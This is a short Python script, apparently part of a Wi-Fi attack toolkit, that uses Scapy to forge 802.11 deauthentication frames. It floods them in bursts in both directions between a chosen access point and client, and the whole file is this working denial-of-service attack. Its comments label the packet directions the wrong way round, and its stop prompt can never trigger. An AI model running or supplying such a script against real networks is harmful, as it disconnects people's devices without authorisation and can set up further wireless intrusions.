from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
from attack_manager import do_command




"""
This script build a fake disconnect packet called 'death authentication'
by 802.11 frame foramt and send to client and to AP
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
"""
sniffer_interface = sys.argv[1]
ap_mac = sys.argv[2]
client_mac = sys.argv[3]



print("attaching client mac:", client_mac)

for y in range(1,4):
    # sending fake packets  in two directions : AP -> client , client -> AP
    # client -> AP
    pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    # AP -> client
    pkt2 = RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
    for _ in range(50):
        print("sending death packets...")
        sendp(pkt1, iface=sniffer_interface, count=20)
        sendp(pkt2, iface=sniffer_interface, count=20)
        if y % 30 == 0:
            press = input("press p to stop, otherwise any\n")
            if press == 'p':
                print("#  Goodbye  #")
                break

